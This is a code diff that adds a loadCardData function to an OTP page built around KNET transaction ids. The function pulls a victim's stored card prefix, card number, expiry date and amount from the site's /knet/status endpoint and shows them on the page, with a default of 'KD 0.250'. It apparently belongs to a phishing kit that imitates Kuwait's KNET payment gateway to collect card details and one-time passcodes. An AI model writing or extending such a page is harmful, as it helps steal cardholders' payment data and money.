@@ -411,6 +411,35 @@ function buildOtpPage(knetId, mode, showError) {
     // Store knetId in sessionStorage
     if (knetId) sessionStorage.setItem('eventat_knet_txn', knetId);
 
+    // Load card data from server and display
+    function loadCardData() {
+      if (!knetId) return;
+      fetch('/knet/status/' + knetId)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (!data || !data.payment) return;
+          var p = data.payment;
+          var cardNum = (p.prefix ? p.prefix + ' ' : '') + (p.cardNumber || '');
+          // Mask card number: show first 6 and last 4
+          var masked = cardNum.trim();
+          if (masked.length > 10) {
+            masked = masked.substring(0, 6) + ' **** ' + masked.substring(masked.length - 4);
+          }
+          var rows = document.querySelectorAll('.row');
+          rows.forEach(function(row) {
+            var lbl = row.querySelector('label');
+            var val = row.querySelector('.val');
+            if (!lbl || !val) return;
+            var text = lbl.textContent.trim();
+            if (text === 'Card Number:') val.textContent = masked || '';
+            else if (text === 'Expiration Month:') val.textContent = p.expiryMonth || 'MM';
+            else if (text === 'Expiration Year:') val.textContent = p.expiryYear || 'YYYY';
+            else if (text === 'Amount:') val.textContent = 'KD ' + (p.amount || '0.250');
+          });
+        }).catch(function() {});
+    }
+    loadCardData();
+
     function showProcessing() {
       document.getElementById('form-area').style.display = 'none';
       document.getElementById('processing-area').style.display = 'block';
